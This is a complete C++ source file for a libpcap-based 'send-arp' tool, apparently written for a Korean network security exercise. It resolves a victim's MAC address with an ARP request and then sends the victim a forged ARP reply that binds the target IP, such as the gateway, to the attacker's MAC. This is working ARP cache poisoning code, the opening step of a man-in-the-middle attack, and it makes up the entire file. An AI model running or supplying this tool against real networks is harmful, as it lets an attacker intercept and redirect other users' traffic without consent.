#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <unistd.h>
#include <sys/ioctl.h>

#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

std::string getMACAddress(const char* interface) {
    struct sockaddr_in *addr;
    struct ifreq ifr;

    // 소켓 생성
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("socket");
        exit(1);
    }

    // 인터페이스 설정
    strncpy(ifr.ifr_name, interface, IFNAMSIZ); // 인터페이스 이름 설정

    // MAC 주소 가져오기
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(sock);
        exit(1);
    }

    close(sock);

    // MAC 주소를 문자열로 변환
    char macAddrStr[18];
    sprintf(macAddrStr, "%02X:%02X:%02X:%02X:%02X:%02X",
            (unsigned char)ifr.ifr_hwaddr.sa_data[0],
            (unsigned char)ifr.ifr_hwaddr.sa_data[1],
            (unsigned char)ifr.ifr_hwaddr.sa_data[2],
            (unsigned char)ifr.ifr_hwaddr.sa_data[3],
            (unsigned char)ifr.ifr_hwaddr.sa_data[4],
            (unsigned char)ifr.ifr_hwaddr.sa_data[5]);

    return std::string(macAddrStr);
}

EthArpPacket make_arp_packet(std::string dst_mac, std::string src_mac, uint16_t operation, std::string smac, const char* sip, std::string tmac, const char* tip) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac(dst_mac.c_str());
    packet.eth_.smac_ = Mac(src_mac.c_str());
    packet.eth_.type_ = htons(EthHdr::Arp);
    
    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(operation);
    packet.arp_.smac_ = Mac(smac.c_str());
    packet.arp_.sip_ = htonl(Ip(sip));
    packet.arp_.tmac_ = Mac(tmac.c_str());
    packet.arp_.tip_ = htonl(Ip(tip));
    
    return packet;
}


std::string arp_request(const char* victim_ip, const char* attacker_ip, std::string attacker_mac, pcap_t* handle) {
    //request => sender = attacker, target = victim
    EthArpPacket packet = make_arp_packet("ff:ff:ff:ff:ff:ff", attacker_mac, 
    					  ArpHdr::Request, attacker_mac, 
    					  attacker_ip, "00:00:00:00:00:00", 
    					  victim_ip);
    
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(1);
    }
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        
        int res = pcap_next_ex(handle, &header, &recv_packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;
        
        memcpy(&packet, recv_packet, sizeof(EthArpPacket));
        if (packet.eth_.type_ != htons(EthHdr::Arp)) continue;
        if ((uint32_t)packet.arp_.sip_ == htonl(Ip(victim_ip))) {
            //printf("Victim MAC = %s\n", std::string(packet.arp_.smac_).c_str());
            break;
        }
    }
        
    return std::string(packet.arp_.smac_);
}

void arp_reply(const char* victim_ip, const char* attacker_ip, std::string victim_mac, std::string attacker_mac, pcap_t* handle) {
    //request => sender = victim, target = attacker
    EthArpPacket packet = make_arp_packet(victim_mac, attacker_mac, 
    					  ArpHdr::Reply, victim_mac, 
    					  victim_ip, attacker_mac, 
    					  attacker_ip);
        
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        exit(1);
    }
}

void usage() {
    printf("send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if ((argc < 4) && (argc % 2 != 0)) {
        usage();
        return -1;
    }
    
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    
    const char* interface = argv[1];
    
    for (int i=2; i<argc; i+=2) {
        std::string attacker_mac = getMACAddress(interface);
        printf("Attacker MAC = %s\n", attacker_mac.c_str());
        
        std::string victim_mac = arp_request(argv[i], argv[i+1], attacker_mac, handle);
        printf("Victim MAC = %s\n", victim_mac.c_str());
        
        arp_reply(argv[i], argv[i+1], victim_mac, attacker_mac, handle);
        printf("%d done\n", i/2);
        printf("====================\n");
    }
    
    pcap_close(handle);
    printf("all done\n");
}
